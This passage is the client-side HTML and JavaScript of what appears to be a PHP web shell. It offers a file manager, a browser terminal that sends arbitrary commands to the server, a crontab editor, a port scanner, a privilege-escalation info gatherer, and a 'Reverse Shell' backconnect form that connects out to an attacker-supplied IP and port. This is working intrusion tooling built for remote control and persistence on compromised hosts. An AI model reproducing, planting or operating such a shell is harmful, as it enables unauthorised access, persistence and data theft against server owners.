                json:'fa-file-code', xml:'fa-file-code', sh:'fa-file-code', py:'fa-file-code',
                jpg:'fa-file-image', jpeg:'fa-file-image', png:'fa-file-image', gif:'fa-file-image', svg:'fa-file-image', webp:'fa-file-image',
                zip:'fa-file-archive', tar:'fa-file-archive', gz:'fa-file-archive', rar:'fa-file-archive',
                pdf:'fa-file-pdf', doc:'fa-file-word', docx:'fa-file-word', xls:'fa-file-excel', xlsx:'fa-file-excel',
                txt:'fa-file-alt', md:'fa-file-alt', log:'fa-file-alt',
                sql:'fa-database',
            };
            const icon = iconMap[ext] || 'fa-file';
            return `<i class="fas ${icon} file-icon file"></i>`;
        }

        function renderFiles(files) {
            const tbody = $('#fileBody');
            tbody.empty();

            if (files.length === 0) {
                tbody.html(`<tr><td colspan="7" style="text-align:center;padding:48px;color:#404858;">
                    <i class="fas fa-folder-open" style="font-size:24px;margin-bottom:8px;display:block;"></i>
                    <span style="font-size:12px;">Empty directory</span></td></tr>`);
                $('#statusCount').text('0 items');
                return;
            }

            files.forEach(function(file) {
                const icon = getFileIcon(file);
                const nameCell = file.type === 'folder'
                    ? `<a href="#" class="file-name-link folder-type folder-link">${file.name}</a>`
                    : `<a href="#" class="file-name-link file-link">${file.name}</a>`;

                const editBtn = file.type === 'file'
                    ? `<button class="row-act-btn edit-btn" title="Edit"><i class="fas fa-edit"></i></button>` : '';
                const dlBtn = file.type === 'file'
                    ? `<button class="row-act-btn download-btn" title="Download"><i class="fas fa-download"></i></button>` : '';

                const tr = $(`<tr class="file-row" data-name="${file.name}" data-type="${file.type}">
                    <td style="padding-left:16px;"><input type="checkbox" class="file-checkbox" /></td>
                    <td>${icon}</td>
                    <td><span class="file-name-cell">${nameCell}</span></td>
                    <td style="font-family:'Geist Mono',monospace;font-size:11px;color:#606878;">${file.size}</td>
                    <td style="font-family:'Geist Mono',monospace;font-size:11px;color:#404858;">${file.last_modified}</td>
                    <td><span class="perm-badge">${file.permissions}</span></td>
                    <td style="text-align:right;padding-right:10px;">
                        <div class="row-actions">
                            ${editBtn}
                            <button class="row-act-btn rename-btn" title="Rename"><i class="fas fa-i-cursor"></i></button>
                            <button class="row-act-btn chmod-btn" title="Permissions" data-current-perms="${file.permissions}"><i class="fas fa-key"></i></button>
                            ${dlBtn}
                            <button class="row-act-btn delete-btn" title="Delete"><i class="fas fa-trash"></i></button>
                        </div>
                    </td>
                </tr>`);
                tbody.append(tr);
            });

            $('#statusCount').text(files.length + ' item' + (files.length !== 1 ? 's' : ''));
        }

        function updateBreadcrumb(data) {
            const bar = $('#breadcrumbBar');
            bar.empty();
            $('#statusPath').text(data.path || '/');

            const crumbs = data.breadcrumbs || [];
            crumbs.forEach(function(c, i) {
                if (i > 0) bar.append('<span class="bc-sep">/</span>');
                const isLast = i === crumbs.length - 1;
                const el = $(`<span class="bc-item ${isLast ? 'current' : ''}">${c.name}</span>`);
                if (!isLast) {
                    el.on('click', function() { changeDirectory(c.path); });
                }
                bar.append(el);
            });
        }

        function handleApiResponse(r) {
            if (r.success) { showSuccess(r.message || 'Done.'); loadFiles(); }
            else showError(r.message || 'Unknown error.');
        }

        // ===================== TABLE EVENTS =====================
        const tbody = $('#fileBody');

        tbody.on('click', '.folder-link', function(e) {
            e.preventDefault();
            changeDirectory($(this).closest('.file-row').data('name'));
        });
        tbody.on('click', '.file-link', function(e) {
            e.preventDefault();
            editFile($(this).closest('.file-row').data('name'));
        });

        // ===================== ROW ACTION BUTTONS =====================
        tbody.on('click', '.edit-btn', function(e) {
            e.preventDefault(); e.stopPropagation();
            editFile($(this).closest('.file-row').data('name'));
        });
        tbody.on('click', '.rename-btn', function(e) {
            e.preventDefault(); e.stopPropagation();
            openRenameModal($(this).closest('.file-row').data('name'));
        });
        tbody.on('click', '.chmod-btn', function(e) {
            e.preventDefault(); e.stopPropagation();
            const row = $(this).closest('.file-row');
            openChmodModal(row.data('name'), $(this).data('current-perms'));
        });
        tbody.on('click', '.download-btn', function(e) {
            e.preventDefault(); e.stopPropagation();
            window.location.href = `?action=download&name=${encodeURIComponent($(this).closest('.file-row').data('name'))}`;
        });
        tbody.on('click', '.delete-btn', function(e) {
            e.preventDefault(); e.stopPropagation();
            deleteItem($(this).closest('.file-row').data('name'));
        });

        // ===================== CONTEXT MENU =====================
        let ctxTarget = null;
        $(document).on('contextmenu', '.file-row', function(e) {
            e.preventDefault();
            ctxTarget = $(this);
            const m = $('#contextMenu');
            let x = e.clientX, y = e.clientY;
            if (x + 200 > window.innerWidth) x = window.innerWidth - 205;
            if (y + 200 > window.innerHeight) y = window.innerHeight - 205;
            m.css({ left:x+'px', top:y+'px', display:'block' });
        });
        $(document).on('click', function() { $('#contextMenu').hide(); });
        $('#contextMenu').on('click', function(e) { e.stopPropagation(); });

        $('.ctx-edit').on('click', function(e) { e.preventDefault(); $('#contextMenu').hide(); if(ctxTarget) editFile(ctxTarget.data('name')); });
        $('.ctx-rename').on('click', function(e) { e.preventDefault(); $('#contextMenu').hide(); if(ctxTarget) openRenameModal(ctxTarget.data('name')); });
        $('.ctx-chmod').on('click', function(e) { e.preventDefault(); $('#contextMenu').hide(); if(ctxTarget) openChmodModal(ctxTarget.data('name'), ctxTarget.find('.perm-badge').text()); });
        $('.ctx-download').on('click', function(e) { e.preventDefault(); $('#contextMenu').hide(); if(ctxTarget) window.location.href = `?action=download&name=${encodeURIComponent(ctxTarget.data('name'))}`; });
        $('.ctx-delete').on('click', function(e) { e.preventDefault(); $('#contextMenu').hide(); if(ctxTarget) deleteItem(ctxTarget.data('name')); });

        // ===================== SEARCH =====================
        $('#searchInput').on('input', function() {
            const q = $(this).val().toLowerCase();
            const filtered = currentFiles.filter(f => f.name.toLowerCase().includes(q));
            renderFiles(filtered);
        });

        // ===================== NAVIGATION =====================
        $('#goToRootBtn').on('click', function() { changeDirectory(''); });
        $('#goUpBtn').on('click', function() { changeDirectory('..'); });

        // ===================== CREATE / RENAME =====================
        function openCreateModal(type) {
            $('#actionType').val(type);
            $('#originalName').val('');
            $('#formModalTitle').text(type === 'create-file' ? 'New File' : 'New Folder');
            $('#itemNameLabel').text(type === 'create-file' ? 'File Name' : 'Folder Name');
            $('#itemName').val('').attr('placeholder', type === 'create-file' ? 'e.g., index.php' : 'e.g., new_folder');
            openModal('formModal');
            setTimeout(()=>$('#itemName').focus(), 50);
        }

        function openRenameModal(name) {
            $('#actionType').val('rename');
            $('#originalName').val(name);
            $('#formModalTitle').text('Rename');
            $('#itemNameLabel').text('New Name');
            $('#itemName').val(name);
            openModal('formModal');
            setTimeout(()=>{ const el = $('#itemName')[0]; el.focus(); el.select(); }, 50);
        }

        $('#createFileBtn').on('click', function() { openCreateModal('create-file'); });
        $('#createDirBtn').on('click', function() { openCreateModal('create-dir'); });

        $('#saveBtn').on('click', function() {
            const action = $('#actionType').val();
            const name = $('#itemName').val().trim();
            if (!name) return showError('Name cannot be empty!');
            let postData = { action, name };
            if (action === 'rename') { postData.old_name = $('#originalName').val(); postData.new_name = name; }
            $.post(API_URL, postData, handleApiResponse, 'json').fail(()=>showError('Error.'));
            closeModal('formModal');
        });
        $('#itemName').on('keydown', function(e) { if (e.key === 'Enter') $('#saveBtn').click(); });

        // ===================== DELETE =====================
        function deleteItem(name) {
            Swal.fire({
                title:'Delete?', text:`"${name}" will be permanently deleted.`,
                icon:'warning', showCancelButton:true,
                confirmButtonText:'Delete', cancelButtonText:'Cancel',
                confirmButtonColor:'#e85d38'
            }).then(r => {
                if (r.isConfirmed) {
                    $.post(API_URL, { action:'delete', name }, handleApiResponse, 'json').fail(()=>showError('Failed.'));
                }
            });
        }

        // ===================== CHMOD =====================
        let chmodTarget = '';
        function openChmodModal(name, perms) {
            chmodTarget = name;
            $('#chmodItemName').text(name);
            $('#chmodValue').val(perms || '0644');
            openModal('chmodModal');
            setTimeout(()=>$('#chmodValue').focus(), 50);
        }
        $('#saveChmodBtn').on('click', function() {
            const perms = $('#chmodValue').val();
            if (!perms) return showError('Enter permissions value!');
            $.post(API_URL, { action:'chmod', name:chmodTarget, perms }, handleApiResponse, 'json').fail(()=>showError('Error.'));
            closeModal('chmodModal');
        });

        // ===================== EDITOR =====================
        const editor = ace.edit('editor');
        editor.setTheme('ace/theme/tomorrow_night_eighties');
        editor.session.setMode('ace/mode/php');
        editor.setOptions({ fontSize:'13px', fontFamily:"'Geist Mono', monospace" });

        let fileToEdit = '';
        function editFile(fileName) {
            fileToEdit = fileName;
            showLoading('Loading...', fileName);
            const ext = fileName.split('.').pop().toLowerCase();
            const modeMap = { js:'javascript', ts:'typescript', css:'css', html:'html', json:'json', md:'markdown', sh:'sh', py:'python', xml:'xml', sql:'sql', txt:'text' };
            editor.session.setMode(`ace/mode/${modeMap[ext] || 'text'}`);
            $.get(API_URL, { action:'get-content', name:fileName }, function(r) {
                if (r.success) {
                    Swal.close();
                    editor.setValue(r.content, -1);
                    $('#editorFileName').text(fileName);
                    openModal('editorModal');
                } else showError(r.message);
            }).fail(()=>showError('Failed to load file.'));
        }

        $('#saveEditorBtn').on('click', function() {
            $.post(API_URL, { action:'save-content', name:fileToEdit, content:editor.getValue() }, function(r) {
                if (r.success) { showSuccess('Saved!'); closeModal('editorModal'); }
                else showError(r.message);
            }, 'json').fail(()=>showError('Error saving file.'));
        });

        // ===================== UPLOAD =====================
        $('#uploadBtn').on('click', function() {
            $('#fileUploadInput').click();
        });

        $('#fileUploadInput').on('change', function() {
            if (!this.files.length) return;
            const fd = new FormData();
            fd.append('action', 'upload-file');
            for (let i = 0; i < this.files.length; i++) fd.append('files_to_upload[]', this.files[i]);
            showLoading('Uploading...', `${this.files.length} file(s)`);
            $.ajax({ url:API_URL, type:'POST', data:fd, processData:false, contentType:false,
                dataType:'json', success:handleApiResponse, error:()=>showError('Upload failed.')
            }).always(()=>$(this).val(''));
        });

        // ===================== BULK ACTIONS =====================
        function getSelected() {
            return $('.file-checkbox:checked').closest('.file-row').map(function(){ return $(this).data('name'); }).get();
        }
        function updateBulkBar() {
            const n = $('.file-checkbox:checked').length;
            $('#selCount').text(n);
            if (n > 0) $('#bulkBar').removeClass('hidden');
            else $('#bulkBar').addClass('hidden');
            const total = $('.file-checkbox').length;
            $('#selectAll').prop('checked', n > 0 && n === total);
        }
        $(document).on('change', '.file-checkbox', updateBulkBar);
        $('#selectAll').on('change', function() { $('.file-checkbox').prop('checked', this.checked); updateBulkBar(); });

        $('#bulkDelete').on('click', function() {
            const files = getSelected();
            if (!files.length) return;
            Swal.fire({
                title:'Bulk Delete?', text:`Delete ${files.length} items permanently?`,
                icon:'warning', showCancelButton:true,
                confirmButtonText:'Delete All', confirmButtonColor:'#e85d38'
            }).then(r => {
                if (r.isConfirmed) $.post(API_URL, { action:'bulk-delete', items:JSON.stringify(files) }, handleApiResponse, 'json').fail(()=>showError('Failed.'));
            });
        });
        $('#bulkDownload').on('click', function() {
            const files = getSelected();
            if (files.length) window.location.href = `?action=bulk-download&items=${encodeURIComponent(JSON.stringify(files))}`;
        });
        $('#bulkChmod').on('click', function() {
            const files = getSelected();
            if (!files.length) return;
            $('#bulkChmodCount').text(files.length);
            $('#bulkChmodValue').val('');
            openModal('bulkChmodModal');
        });
        $('#saveBulkChmodBtn').on('click', function() {
            const files = getSelected(), perms = $('#bulkChmodValue').val();
            if (!perms.match(/^[0-7]{4}$/)) return showError('Use 4-digit octal (e.g., 0755).');
            $.post(API_URL, { action:'bulk-chmod', items:JSON.stringify(files), perms }, handleApiResponse, 'json').fail(()=>showError('Error.'));
            closeModal('bulkChmodModal');
        });

        // ===================== CRON MANAGER =====================
        function openCronModal() {
            apiCall('cron_manager', { sub_action:'list' }).done(function(r) {
                if (r.success) { $('#cronJobsTextarea').val(r.cron_jobs); openModal('cronModal'); }
                else showError(r.message);
            }).fail(()=>showError('Failed to load crontab.'));
        }
        $('#saveCronBtn').on('click', function() {
            apiCall('cron_manager', { sub_action:'save', jobs:$('#cronJobsTextarea').val() }).done(function(r) {
                if (r.success) { showSuccess(r.message); closeModal('cronModal'); }
                else showError(r.message);
            }).fail(()=>showError('Failed to save.'));
        });

        // ===================== TOOLS =====================

        // Port Scan
        async function runPortScan() {
            const { value:fv } = await Swal.fire({
                title:'Port Scanner',
                html:`<input id="sh" class="swal2-input" placeholder="Host" value="127.0.0.1">
                      <input id="sp" class="swal2-input" placeholder="Ports: 80,443,8000-8080" value="21,22,25,80,443,3306,5432">`,
                focusConfirm:false,
                preConfirm:()=>({ host:document.getElementById('sh').value, ports:document.getElementById('sp').value })
            });
            if (!fv?.host) return;
            showLoading('Scanning...', fv.host);
            apiCall('port_scan', fv).done(function(r) {
                if (r.success) {
                    Swal.fire({ title:'Port Scan Results', icon:'info', html:
                        `<p style="font-size:13px;">Host: <code>${r.host}</code></p>
                        <div class="tool-output">${r.open_ports.length ? r.open_ports.join(', ') : 'No open ports found.'}</div>`
                    });
                } else showError(r.message);
            }).fail(()=>showError('Scan failed.'));
        }

        // Linux exploit
        function runLinuxExploit() {
            showLoading('Gathering Info...');
            apiCall('linux_exploit_suggester', {}).done(function(r) {
                if (r.success) {
                    let html = '<dl class="text-left">';
                    for (const [k,v] of Object.entries(r.results)) html += `<dt>${k}</dt><dd>${v||'N/A'}</dd>`;
                    html += '</dl>';
                    Swal.fire({ title:'System Info', html:`<div class="tool-output">${html}</div>`, width:'700px' });
                } else showError(r.message);
            }).fail(()=>showError('Failed.'));
        }

        // Backconnect
        async function runBackconnect() {
            const { value:fv } = await Swal.fire({
                title:'Reverse Shell',
                html:`<input id="bi" class="swal2-input" placeholder="Your IP">
                      <input id="bp" class="swal2-input" placeholder="Port">`,
                focusConfirm:false,
                confirmButtonText:'Connect',
                preConfirm:()=>({ ip:document.getElementById('bi').value, port:document.getElementById('bp').value })
            });
            if (!fv?.ip || !fv?.port) return;
            showLoading('Connecting...', `${fv.ip}:${fv.port}`);
            apiCall('backconnect', fv).done(r => {
                if (r.success) Swal.fire({ icon:'success', title:'Initiated', text:r.message, timer:5000 });
                else showError(r.message);
            }).fail((xhr,status)=>{
                if (status==='timeout'||xhr.statusText==='timeout') showSuccess(`Connected to ${fv.ip}:${fv.port}`);
                else showError('Failed: '+(xhr.responseJSON?.message||'Check console'));
            });
        }

        // Bind tools (sidebar + panel buttons)
        ['#portScanBtn','#portScanBtn2'].forEach(s=>$(s).on('click', runPortScan));
        ['#linuxExploitBtn','#linuxExploitBtn2'].forEach(s=>$(s).on('click', runLinuxExploit));
        ['#backconnectBtn','#backconnectBtn2'].forEach(s=>$(s).on('click', runBackconnect));
        ['#cronManagerBtn','#cronManagerBtn2'].forEach(s=>$(s).on('click', openCronModal));

        // ===================== PANEL RESIZE =====================
        let resizing = false;
        $('#panelDivider').on('mousedown', function(e) {
            resizing = true;
            e.preventDefault();
        });
        $(document).on('mousemove', function(e) {
            if (!resizing) return;
            const total = window.innerWidth;
            const newW = Math.max(260, Math.min(600, total - e.clientX));
            $('#rightPanel').css('width', newW + 'px');
            fitAddon.fit();
        }).on('mouseup', function() { resizing = false; });

        // ===================== INIT =====================
        loadFiles();
        updateStats();
    });
    </script>

    <script>
    // ===== TERMINAL =====
    const termTheme = {
        background: '#0a0c0f',
        foreground: '#c8d0e0',
        cursor: '#e85d38',
        selectionBackground: '#1e2d44',
        black: '#1a1f27', brightBlack: '#404858',
        red: '#e85d38', brightRed: '#f07a5c',
        green: '#3db554', brightGreen: '#5ec971',
        yellow: '#f0b429', brightYellow: '#fac948',
        blue: '#4a9eff', brightBlue: '#7ab8ff',
        magenta: '#b06dff', brightMagenta: '#c89aff',
        cyan: '#3ec8c8', brightCyan: '#60dada',
        white: '#c8d0e0', brightWhite: '#e8edf5'
    };

    const term = new Terminal({
        cursorBlink: true,
        allowTransparency: true,
        theme: termTheme,
        fontFamily: "'Geist Mono', monospace",
        fontSize: 12,
        lineHeight: 1.4,
    });

    const fitAddon = new FitAddon.FitAddon();
    term.loadAddon(fitAddon);
    term.open(document.getElementById('terminal'));

    function safeFit() {
        try { fitAddon.fit(); } catch(e) {}
    }
    safeFit();

    const resizeObs = new ResizeObserver(() => safeFit());
    resizeObs.observe(document.getElementById('terminalWrap'));

    let command = '';
    const prompt = '\x1b[38;5;202m$\x1b[0m ';
    term.write(prompt);

    document.getElementById('clearTermBtn').addEventListener('click', function() {
        term.clear();
        term.write(prompt + command);
    });

    term.onData(data => {
        if (data === '\r') {
            const cmd = command.trim();
            term.writeln('');
            if (cmd === 'clear') { term.clear(); term.write(prompt); }
            else if (cmd) {
                fetch('?action=terminal', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({ cmd })
                }).then(response => {
                    const ct = response.headers.get('content-type');
                    if (ct && ct.includes('application/json')) {
                        return response.json().then(d => {
                            if (d.output) term.write(d.output.replace(/\n/g, '\r\n'));
                            term.write('\r\n' + prompt);
                        });
                    } else {
                        const reader = response.body.getReader();
                        const dec = new TextDecoder();
                        function pump() {
                            return reader.read().then(({ done, value }) => {
                                if (done) { term.write('\r\n' + prompt); return; }
                                term.write(dec.decode(value, { stream:true }).replace(/\n/g, '\r\n'));
                                return pump();
                            });
                        }
                        return pump();
                    }
                }).catch(err => {
                    term.writeln(`\r\n\x1b[31mError: ${err.message}\x1b[0m`);
                    term.write('\r\n' + prompt);
                });
            } else { term.write(prompt); }
            command = '';
        } else if (data === '\x7f') {
            if (command.length > 0) { term.write('\b \b'); command = command.slice(0,-1); }
        } else { command += data; term.write(data); }
    });

    term.onKey(({ domEvent: e }) => {
        if (e.ctrlKey && e.key.toLowerCase() === 'l') {
            e.preventDefault();
            term.clear();
            term.write(prompt + command);
        }
    });
    </script>
</body>
</html>
